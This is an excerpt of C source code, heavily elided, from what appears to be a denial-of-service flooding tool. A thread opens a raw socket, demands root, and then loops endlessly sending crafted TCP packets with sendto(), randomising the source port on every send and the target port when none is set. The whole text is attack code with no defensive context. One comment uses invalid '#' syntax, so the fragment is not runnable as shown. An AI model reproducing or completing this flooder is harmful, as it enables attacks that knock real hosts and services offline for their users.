...
void *flooding_thread(void *par1)
{
    ...
    if(s == -1)
    {
        perror("[!] For use Script you need root ...");
        exit(1);
    }
    ...
    int randSP = random_number_beetwhen(1, 65535); # Source Port 1-65535
    ...
    while (1)
    {
        ...
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)       /* a normal send() */
        {
            ...
            if (floodport == 0) {
                rdzeroport = random_number_beetwhen(1, 65535);
                sin.sin_port = htons(rdzeroport);
                tcph->dest = htons (rdzeroport);
            } else {
                sin.sin_port = htons(floodport);
            ...
            randSP = random_number_beetwhen(1, 65535);
            tcph->source = randSP;
